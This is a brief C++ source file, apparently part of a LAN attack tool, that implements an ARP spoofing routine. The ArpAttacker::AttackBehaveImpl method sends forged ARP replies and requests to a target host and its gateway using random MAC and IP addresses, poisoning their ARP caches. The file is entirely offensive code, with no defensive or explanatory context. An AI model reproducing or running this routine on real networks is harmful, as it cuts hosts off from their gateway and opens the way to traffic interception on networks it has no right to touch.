#include "arpattacker.h"
#include "LANAttacker/lanpcap.h"





void ArpAttacker::AttackBehaveImpl(const LANHostInfo &TargetHost)
{
    LANHostInfo GateHost= GetLANPCap()->GetGateWayHostInfo();


    GetLANPCap()->SendArpReplyPacket(TargetHost,GateHost.CreateRandomMacAddrHost());
    GetLANPCap()->SendArpReplyPacket(TargetHost.CreateRandomMacAddrHost(),GateHost);

    GetLANPCap()->SendArpRequestPacket(TargetHost.CreateRandomMacAddrHost(),GateHost);
    GetLANPCap()->SendArpRequestPacket(GateHost.CreateRandomIpAddrHost(),TargetHost);


}


